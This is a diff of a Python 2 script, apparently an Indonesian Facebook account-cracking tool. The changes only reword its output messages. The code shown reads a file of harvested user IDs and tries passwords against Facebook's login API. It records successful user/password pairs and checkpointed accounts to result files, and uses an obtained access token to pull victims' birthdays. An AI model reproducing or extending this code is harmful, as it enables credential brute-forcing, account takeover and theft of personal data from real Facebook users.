@@ -583,7 +583,7 @@ class __crack__:
         try:
             self.apk = raw_input('\n [%s?%s] masukan file : '%(O,N))
             self.id = open(self.apk).read().splitlines()
-            print '\n [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N)
+            print '\n [%s+%s] total id -> [%s%s%s]' %(O,N,M,len(self.id),N)
         except:
             print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu bro cek nomor 1 sampai 4'%(N,M,N,M,self.apk,N);time.sleep(3)
             raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
@@ -682,7 +682,7 @@ class __crack__:
                 loop +=1
                 self.__api__()
             if 'access_token' in response.text and 'EAAA' in response.text:
-                print '\r  #000000#89B061%s[->]  %s • %s                 %s' % (H,user,pw,N)
+                print '\r  #000000#89B061%sOK NGAB : %s • %s                 %s' % (H,user,pw,N)
                 wrt = ' [✓]  %s • %s' % (user,pw)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -694,7 +694,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s[->]  %s • %s • %s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    print '\r  %sCP NGAB : %s • %s • %s %s %s     %s' % (K,user,pw,day,month,year,N)
                     wrt = ' [×] %s • %s • %s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
